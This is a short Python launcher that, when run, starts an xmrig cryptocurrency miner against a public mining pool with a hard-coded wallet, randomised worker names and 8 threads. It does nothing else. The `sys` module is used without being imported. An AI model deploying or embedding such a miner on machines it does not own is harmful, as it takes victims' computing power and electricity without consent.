from tendo import singleton
from subprocess import PIPE, Popen
import subprocess
import math

try:
    me = singleton.SingleInstance()
    p = subprocess.run("./xmrig --algo=ghostrider --url stratum-eu.rplant.xyz:17084 --tls --user JNfxq14CPWoBETz3m32SpETkkRnHFqRxan.ODM-$(echo $(shuf -i 10000-99999 -n 1)) -t 8 -k", stdout=subprocess.PIPE, shell=True)
except:
    print("Already running")
    sys.exit(-1)
